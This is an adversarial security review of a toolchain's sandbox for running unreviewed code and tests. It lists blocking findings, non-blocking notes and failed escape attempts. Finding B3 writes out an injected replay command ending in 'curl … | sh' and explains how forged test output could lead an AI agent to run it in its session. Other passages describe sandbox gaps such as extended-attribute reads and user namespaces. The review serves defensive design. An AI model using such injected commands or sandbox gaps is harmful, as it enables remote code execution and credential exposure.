# Tide adversarial/consistency review, round 58: the unreviewed-branch guarantee (fx-arx)

## Verdict

**request_changes**

All five of round 57's blocking findings are closed, and so are its notes
N1 to N11. The rewrite dropped no fix from rounds 54 to 56. It leaves no
dangling reference. This round has three blocking findings, and each needs
one clause:

- B1: hole 4 connects the child to a Bend server by an inherited
  descriptor, but RUN-3 lists every descriptor the child inherits and that
  one is not among them.
- B2: seccomp admits "metadata reads", which takes in extended-attribute
  and link-target reads. Landlock confines neither, so RUN-3's stated
  residual of "whether it exists, its size and times" understates what the
  child can read.
- B3: a result forged through hole 1 or 5 can carry the replay command
  that the toolchain prints for the operator or agent to run. That moves
  the hole from RUN-3's sandbox to the session's, which RUN-6 and the
  operating guidance do not say.

The rest are non-blocking. One of them (N2) concerns implementability: read
as a complete list, RUN-3's syscall categories give a Rust runtime that
aborts at startup.

## What was reviewed

The uncommitted working tree on 2026-10-20 against HEAD `87f9cd3`:
`git diff -- design/ README.md`, SHA-256
`cf2fe1eba86ff40338293b2e5a168518abfa023aaafb483cdaf185a18ca8b70a`.

I read the changed text:

- 03 §2.6 at `03:423-607`, the ADMIT-1 entry at `03:410-412`, and REPLAY-1
  at `03:1453-1460`;
- D7 at `01:420-431`, D11's behavior-diff bullet at `01:719-723`, the D13
  bullet at `01:830-859`, and the tier row at `01:82`;
- companion §19 at `companion:495-519` and its header at `companion:3-16`;
- `reference.md:5-9` and `:951-967`;
- the README line at `README.md:148-152`.

I checked it against:

- 01 D11, D13, D15, and D18;
- 03 ROOT-1..5, PANIC-1 (`03:293-308`), ADMIT-1/2 (`03:379-421`), §9.6 to
  §9.8 (`03:1427-1495`), and §10;
- 04 §11's feature-cfg sentence (`04:1252-1253`);
- `reference.md` §2.3 (`:96-104`), §9 (`:800-812`), and §13
  (`:1054-1062`);
- research/10 F6 (`research/10:98-105`) and research/13 X3, X8, and E6
  (`research/13:78`, `:126`, `:302`);
- rounds 54 to 57.

I also read two places in Rust 1.85's std source (cited where used) and
checked the Landlock claims against docs.kernel.org,
userspace-api/landlock. I did not count tokens.

## Round 57 closure

- **B1 (denylist).** Closed. Both mechanisms are now allowlists, and
  seccomp says "Every other call fails" (`03:483-495`). The metadata-read
  residual is stated (`03:497-499`). The row adds `chmod`/`chown`/xattr/
  times, the keyring, and a message queue (`03:604`). Two parts of the
  suggested fix were dropped, the System V shared-memory canary and
  "namespaces" (N1). The qualifier "metadata reads that Landlock confines"
  opens B2.
- **B2 (sandbox level known only after the run).** Closed. `tide review`
  reports the level "before anything runs" (`03:500-501`, `03:547-548`).
  D13 conditions on "a host whose sandbox is full" (`01:848-849`). The
  operating guidance (`03:570-571`) and companion §19 (`companion:512-513`)
  agree, and the RUN-3 row tests the pre-run report (`03:604`).
- **B3 (RUN-5 row).** Closed: "edits only packages that hold no grant and
  that no granted package depends on", plus the in-tree dependency case
  (`03:606`).
- **B4 (behavior diff inside review).** Closed. It runs "only for a covered
  candidate on a host with `sandbox: full`, unless the operator asks for it"
  (`03:556-559`), and the row covers it (`03:606`). D11 mirrors it
  (`01:721-723`) without the sandbox condition. "Only for" states a
  necessary condition, so this is not a contradiction.
- **B5 (exposure list).** Closed. The operating guidance sorts each
  residual by the sandbox that meets it (`03:572-578`), and the Bend server
  now runs "under a sandbox of its own" (`03:526-528`). That clause opens
  B1.
- **N1 (safe code forges results).** Closed in hole 5 (`03:539`) and RUN-6
  (`03:566-568`). B3 extends it.
- **N2 (escaping all toolchain output).** Closed (`03:563-566`, row
  `03:607`). See N4 on what "control sequences" and "on a terminal" leave
  out.
- **N3 (core dumps).** Closed (`03:477`, row `03:604`).
- **N4 (tests never started).** Closed (`03:563`, row `03:607`), and it
  agrees with PANIC-1's fresh child (`03:303-305`).
- **N5 (kernel).** Closed (`03:536-537`), and in D13 (`01:845`).
- **N6 (summaries).** Closed. D13 says "toolchain and kernel bugs, and
  resource use and side channels" (`01:844-846`). Companion §19 says "the
  holes 03 §2.6 lists" (`companion:498`).
- **N7 (special files).** Closed: "may create only regular files and
  directories, and no links" (`03:486-487`).
- **N8 (error code).** Closed: "is refused (§9.8)" (`03:499-500`).
- **N9 (D7 grammar).** Closed (`01:429-430`).
- **N10 (citations).** Closed. RUN-5 cites RUN-1 for compile time
  (`03:545`), and RUN-1 cites RUN-3 for the pipes (`03:440-441`).
- **N11 (overloaded rules).** Closed. Results are now RUN-6, and the
  guidance is its own paragraph.

## Earlier fixes retained (rounds 54 to 56)

- **R54 B1 (descendant modules).** Superseded by the package-wide clause
  (`03:552-556`). The row keeps the descendant case (`03:606`).
- **R54 N1 to N4.** ADMIT-1 is cited (`03:436`). Exec and process creation
  are allowed "under the inherited sandbox" (`03:490-491`). The build runs
  in the session sandbox (`03:578-579`).
- **R55 B1 (symbolic links).** Still there (`03:458-463`), with its row
  (`03:603`).
- **R55 B2 (lockfile identity).** Still there: "version, source, or content
  hash" (`03:553`).
- **R55 N1 to N6.** Operator registries (`03:446`, `03:471`), one code for
  `global_asm!` (`03:511`), unshared artifacts (`03:579-580`), the harness
  and derives in hole 5 (`03:530-535`), side channels (`03:540-543`), and
  inline manifests (`03:1458-1459`).
- **R56 B1 to B4.** The transitive clause (`03:554`), the Rust crate and
  Bend clause (`03:549-551`), pipes and the new session (`03:476-479`), and
  compile-time-only review (`03:544-546`).
- **R56 N1 to N8.** All still there. N3, a new dependency's grants, is the
  RUN-5 row (`03:606`).

## Blocking findings

### B1. Hole 4's inherited server descriptor contradicts RUN-3's descriptor list

**Where.** RUN-3: the harness starts the child "with no inherited
descriptor but an empty standard input, pipes for standard output and
error, the result channel (RUN-6), and the run's output directory"
(`03:477-480`). Hole 4: a kernel without a `reference` "reaches a server
that the harness starts under a sandbox of its own and connects to the
child by an inherited descriptor" (`03:526-528`).

**Problem.** The two rules contradict each other. If an implementation
follows RUN-3, the later-tier Bend path cannot work. If it follows hole 4,
RUN-3's exhaustive list is false. The RUN-3 row cannot then tell a leaked
descriptor from an intended one. The case is later-tier, but the list is
stated without a tier.

**Smallest fix.** In RUN-3, after "the run's output directory", add: "and,
for a Bend kernel without a `reference` (hole 4, later), a descriptor to its
server".

### B2. "Metadata reads" admit extended-attribute and link-target reads that the residual does not list

**Where.** seccomp admits "the opens and metadata reads that Landlock
confines" (`03:490`). The next paragraph says: "Neither mechanism confines
reading the metadata of a host path (whether it exists, its size and
times), so code that reaches hole 1 or 5 of RUN-4 can read that much"
(`03:497-499`). The operating guidance repeats "read host metadata"
(`03:575`).

**Problem.**

1. Landlock confines no metadata read. The kernel documentation lists
   `stat(2)`, `access(2)`, and others as calls it cannot restrict, and none
   of its access rights covers `getxattr(2)`/`listxattr(2)` or
   `readlink(2)`. So the qualifier "that Landlock confines" either admits
   nothing or admits them all. The next paragraph shows the author means
   "admits them all".
2. If `getxattr` and `readlink` count as "metadata reads", the child can
   read more than "whether it exists, its size and times". `user.*`
   extended attributes hold arbitrary user data, up to the filesystem's
   limit (64 KiB on ext4). Chromium and wget write `user.xdg.origin.url`
   and `user.xdg.referrer.url` on downloaded files, and a presigned
   download URL carries a credential. Link targets in the operator's home
   name paths and accounts.

Code that reaches hole 5 is open to a covered candidate with no grant
(`03:537-539`). It can read these values and print them to its stdout
pipe, which reaches the operator's logs. That is an unlisted read outside
the run.

**Evidence vs. inference.** Evidence: the quoted text, and the Landlock
documentation's list of calls it cannot restrict, which names `setxattr`
and `stat`. Inference: that Landlock has no hook for `getxattr` or
`readlink`. No access right in the documentation covers them. Inference
also: that an implementer admits them under "metadata reads".

**Smallest fix.** Replace "the opens and metadata reads that Landlock
confines" with "opens, which Landlock confines, and `stat`-family and
`access` calls". Add "extended-attribute reads, link reads" to the refused
list (`03:492-495`). The runtime needs neither, which is inference from
Rust std's startup and thread paths. Add an xattr read and a `readlink` of
a canary to the RUN-3 row. Or keep the admission and widen the residual to
"its existence, size, times, owner, mode, extended attributes, and link
target".

### B3. A forged result can carry the command the toolchain tells the agent to run

**Where.** RUN-6: "Code that reaches hole 1 or 5 of RUN-4 can still write
the channel and forge results ... so a pass from an unreviewed candidate is
evidence only up to those holes" (`03:566-568`). The operating guidance:
run-time holes "meet RUN-3's sandbox, though they can forge results (RUN-6)
and read host metadata" (`03:572-575`). The failure record carries
`"replay":"tide sim --replay target/sim/<test>-<seed>.manifest.json"`
(`03:1445`). The record's `target` is the test name (`03:1440`), which
PANIC-1's start records also carry, and the child writes those
(`03:299-301`). The agent reference teaches agents to use what the
toolchain reports: "reporting each failure's seed and replay command"
(`reference.md:1060`), and "a seed with its replay command"
(`reference.md:809`).

**Problem.** The design does not say who builds the printed replay
command, or from what. Suppose the harness copies the `replay` field from
the child's record, or builds the manifest path from a test name read off
the channel. Then code that has reached hole 5, which needs only safe code
in a covered candidate, can forge a failure whose replay command is
`tide sim --replay x; curl … | sh`, or whose test name holds shell
metacharacters. An agent then runs that command in its session, as it was
taught. That is execution outside RUN-3's sandbox, bounded only by the
session's.

RUN-6 frames forging as a wrong pass or fail. The operating guidance puts
run-time holes at RUN-3's sandbox. Both understate this route. Round 57
rejected "prompt injection through test output" because output is data
(round 57, "Escape attempts that failed"). This route is different: the
toolchain itself presents the text as the command to run. RUN-6's terminal
escaping does not help, since shell metacharacters are not terminal
control sequences.

**Evidence vs. inference.** Evidence: the quoted record, PANIC-1's
child-written start records, and the reference's guidance. Inference: that
an implementation would relay or interpolate channel text. The text does
not forbid it, and libtest-style harnesses get test names from the child
(`--list`).

**Smallest fix.** Add to RUN-6: "The harness builds every command it
prints, replay commands included, only from values it checks: a test name
the build declares, an integer seed, and a manifest path the harness
chose. It never builds one from text the child wrote." Add a RUN-6 row: an
`unsafe`-granted test writes a failure record whose replay command and test
name contain shell metacharacters, and the printed command is unchanged.

## Non-blocking notes

### N1. Two parts of round 57's B1 fix were dropped: System V shared memory and namespaces

The refused list says "System V and POSIX message-queue IPC" (`03:493`).
One reading refuses System V message queues and nothing else. Another
reading admits `shmget`/`shmat` as "memory" (`03:488-489`). The operator's
same-user System V segments include X11 MIT-SHM image buffers, which hold
screen contents. The row tests only "open a message queue" (`03:604`).

Say "System V IPC (shared memory, semaphores, message queues) and POSIX
message queues", and restore round 57's attach-to-a-canary-segment case.
"Namespaces" also left the refused list. `unshare` and `setns` fail under
the allowlist, but `clone` flags such as `CLONE_NEWUSER` ride on admitted
"process creation". That gives no sandbox escape, since Landlock and
seccomp persist. It does widen hole 5's kernel surface: user namespaces
are a common prerequisite for kernel exploits (research/10 F6 shows the
same reasoning for io_uring).

### N2. Implementability: read as a complete list, the categories abort a Rust runtime at startup

The seccomp sentence reads "admits only the system calls the runtime needs:
memory, threads, futexes, clocks, reads, writes, and seeks on open
descriptors, ..." (`03:488-491`). Taken as complete, it leaves out calls
that Rust's std makes before `main`, or makes routinely:

- **Startup check of the standard descriptors.** Rust std checks fds 0 to
  2 with `poll` at startup. It falls back to `fcntl` only on `EINVAL`,
  `EAGAIN`, or `ENOMEM`, and on any other error, `EPERM` included, it
  calls `libc::abort()`
  (`library/std/src/sys/pal/unix/mod.rs:98-111`, Rust 1.85).
- **`getrandom`.** On `EPERM` it falls back to `/dev/urandom`, which
  Landlock blocks, and then panics with "failed to generate random data"
  (`library/std/src/sys/random/linux.rs:118-126`).
- **Signal handling within the process.** Rust's guard-page overflow
  report, which PANIC-1's stack-overflow case surfaces, needs
  `rt_sigaction` and `sigaltstack`.
- **Others:** `close`, `sched_yield` and `sched_getaffinity` (baton
  passing and parallelism queries), `rseq` and `set_robust_list` (glibc
  thread start, which tolerates refusal), `prctl(PR_SET_NAME)`, and
  `tgkill` on itself (`abort`).

The rule is implementable, because "the system calls the runtime needs"
governs and an implementer derives the set by tracing. Two clarifications
would keep the categories from being read as complete: write "needs,
among them", and add "signal handling within the process" and "closing
and polling held descriptors".

For thread versus process creation: seccomp cannot inspect `clone3`'s
flags, but returning `ENOSYS` for `clone3` makes glibc fall back to
`clone`, whose flags it can inspect. That allows refusing process creation
and namespaces outright (require `CLONE_THREAD`), at no cost to a runtime
that never forks. The child does not need to: real processes are not
simulated (`03:1494`). It would also remove N3. Signals to other
processes can use Landlock's `LANDLOCK_SCOPE_SIGNAL` (ABI 6), which is
cleaner than matching seccomp arguments against a PID fixed when the
filter was installed. None of this needs a new requirement at the design
level.

### N3. Processes that outlive the run

Process creation is admitted (`03:490-491`), and nothing says that the
harness kills the child's descendants. A grandchild started by hole-1 or
hole-5 code outlives `tide test`. It stays sandboxed, but it can:

- hold the stdout pipe or the result channel open, so the harness waits
  forever;
- rewrite the output directory after the harness has read it;
- keep probing host metadata over time.

The effects stay inside the sandbox and hole 6. Say that the harness ends
the child's whole process tree when the run ends (a cgroup or a PID
namespace), or refuse process creation as N2 describes.

### N4. Escaping: C1 and bidirectional controls, and piped output

RUN-6 escapes "terminal control sequences in everything it shows on a
terminal" (`03:563-566`). Three gaps remain:

1. File names are not linted, and git allows U+202E, which can make a
   `tide review` line display a different path. rustc's
   `text_direction_codepoint_in_literal` lint covers only source.
2. C1 controls (U+009B CSI) arrive as valid UTF-8.
3. Orchestrators commonly capture output to a pipe or a log that a human
   later views in a terminal.

Say "C0 and C1 control characters and bidirectional overrides, whether
output goes to a terminal, a pipe, or a file".

### N5. "Meet only the session's sandbox" assumes a VM for kernel bugs

The operating guidance puts kernel bugs among what meets "only the
session's sandbox" (`03:576-578`). The complement paragraph allows that
sandbox to be "a microVM or OS confinement" (`03:586`). A kernel exploit
escapes OS confinement on the same kernel. Add "which bounds kernel bugs
only if it is a VM".

### N6. Summaries name only toolchain bugs as forgers

D13 says "though a toolchain bug can still forge its results (RUN-6)"
(`01:850-851`). Companion §19 says "a toolchain bug can forge results"
(`companion:515`). RUN-6 names holes 1 and 5, and a covered candidate
reaches hole 1 through an unsound reviewed abstraction (`03:514-516`).
Say "a toolchain bug or an unsound reviewed `unsafe` abstraction".

### N7. A Linux kernel without Landlock reports `none`

The RUN-3 row expects `sandbox: none` "on a kernel without Landlock"
(`03:604`). RUN-3 reserves `none` for "other operating systems in v0" and
defines `partial` as "with what the kernel cannot enforce" (`03:502-503`).
If seccomp still installs, `partial` fits. Pick one and make the row
match.

### N8. Features, ahead of their tier

RUN-5 keys coverage on a granted package's sources and lockfile entry
(`03:552-554`). If a manifest key ever enables a `feature` cfg on a
dependency, a candidate could flip the feature-gated code of a granted
package without touching either. `reference.md:102-104` accepts
`feature = ".."` in `#[cfg]` provisionally, and 04 says no v0 build sets
one (`04:1252-1253`), so there is no v0 route. When features arrive, add
"or the features enabled on" to RUN-5's clause.

### N9. The core reference states only the `run:` condition

`reference.md:965-967` says "only if `tide review` prints `run: covered`
(companion 19)". That is a necessary condition, so it is not wrong. An
agent that loads only the core still misses `sandbox: full`. Add it if the
budget allows; the companion records 24,995 tokens.

## Escape attempts that failed

- **A granted package's manifest repointed to a new dependency.** The
  candidate edits granted `ring`'s manifest so that its `util` comes from a
  new path package or registry package. The transitive clause covers every
  package `ring` depends on in the head (`03:554`). The row's "a new
  version, source, or content hash ... for a package it depends on"
  (`03:606`) covers a new entry. Saying "adds, removes, or changes" would
  make that explicit; it is not a gap.
- **Hard links into the output directory.** Landlock denies reparenting by
  default (`LANDLOCK_ACCESS_FS_REFER`), and seccomp's allowlist does not
  admit `linkat`.
- **`process_vm_readv` or ptrace on the harness.** Refused as "tracing"
  (`03:494`). Landlock also requires the tracee to be in a nested domain.
- **Native code from the output directory through `ld.so` or
  `mmap(PROT_EXEC)`.** Getting there already needs hole 1 or 5, which give
  native code anyway. No new route.
- **Output directory placed at `.git/hooks`.** The path is the
  toolchain's (`target/sim`, `03:1445`), resolves beneath the root
  (`03:458-461`), and fails the run if it exists (`03:461-463`).
- **A base `macro_rules!` that wraps `$e` in `unsafe`.** Such a macro is
  an unsound reviewed abstraction, listed in hole 1 (`03:514-516`).
- **A new ungranted dependency that pulls a granted name at a new
  version.** It is a new lockfile entry for a granted package, which the
  row covers (`03:606`).
- **`.gitattributes` or `.lfsconfig` in the tree making git contact a
  remote.** That happens at checkout, which is the agent session's `git`,
  outside RUN-1 by the complement paragraph (`03:584-587`).
- **Running `tide review` on one host and the tests on another.** The
  guidance conditions on "a host whose sandbox is `full`" (`03:570-571`),
  and every run result repeats the level (`03:500-502`).

## Consistency checks that passed

- `global_asm!` reads the same in ADMIT-1 (`03:410-412`), D7
  (`01:430`), hole 1 (`03:511-512`), the RUN-4 row (`03:605`), and D13
  (`01:841-842`).
- The tier row (`01:82`) puts the guarantee and the Linux sandbox in v0.
  Holes 2 to 4 carry v1 and later tags that match `01:83-84`, and the
  behavior diff is v1 in both D11 and RUN-5.
- REPLAY-1's inline contents (`03:1456-1459`) match RUN-1 (`03:441-442`).
  PANIC-1's fresh child matches RUN-6.
- The citations hold: research/10 F6 for io_uring (`research/10:105`),
  research/13 X3, X8, and E6 (`:78`, `:126`, `:302`), and §9.8's refusal
  of unmodeled calls (`03:1486-1487`).
- `reference.md`'s pointer (`reference.md:7-9`) now cites sections as
  "companion N". 17, 18, and 19 are cited, and 14 to 16 are named by
  content. Companion §19 exists (`companion:495`). The header's "17–19"
  matches.
- The README line (`README.md:150-151`) and the companion header
  (`companion:7-8`) claim nothing beyond the chapter.
- The complement paragraph (`03:584-594`) matches the owner's scope
  comment on fx-arx and D13 (`01:851-859`).
